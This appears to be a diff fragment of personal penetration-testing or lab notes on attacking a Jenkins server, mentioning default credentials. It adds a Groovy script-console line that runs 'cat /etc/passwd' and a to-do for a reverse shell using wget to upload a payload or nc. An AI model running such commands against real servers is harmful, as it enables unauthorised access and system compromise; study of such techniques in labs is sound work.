@@ -68,3 +68,15 @@ Google search: "jenkins default credentials"
 
 
 
+----
+
+String result = "cat /etc/passwd ".execute().text
+println result
+
+https://groovy-lang.gitlab.io/101-scripts/basico/command_local-en.html
+
+**DO:** reverse shell
+- wget is available. Could upload a payload???
+- nc is also available: /usr/bin/nc
+
+
